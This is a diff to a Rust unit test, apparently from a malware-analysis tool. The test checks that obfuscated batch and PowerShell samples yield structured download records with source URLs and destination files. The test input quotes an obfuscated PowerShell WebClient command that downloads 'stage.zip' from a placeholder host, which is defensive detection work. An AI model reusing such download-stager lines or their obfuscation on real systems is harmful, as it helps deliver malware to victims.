@@ -10407,15 +10407,17 @@ powershell -Command "x('%尔克克尔:~28,1%%德德耻克:~35,1%%尔克克尔:~4
 powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.example/stage.zip','b.zip')""#,
             &mut env,
         );
-        for expected in [
-            "https://drop.example/payload.zip",
-            "https://raw.example/stage.zip",
+        for (expected, expected_dst) in [
+            ("https://drop.example/payload.zip", "a.zip"),
+            ("https://raw.example/stage.zip", "b.zip"),
         ] {
             assert!(
                 env.traits
                     .iter()
-                    .any(|t| matches!(t, Trait::Download { src, cmd, dst: None }
-                        if cmd == "powershell-webclient-typo" && src == expected)),
+                    .any(|t| matches!(t, Trait::Download { src, cmd, dst }
+                        if cmd == "powershell-webclient-typo"
+                            && src == expected
+                            && dst.as_deref() == Some(expected_dst))),
                 "missing structured Download for {expected}: {:?}",
                 env.traits
             );
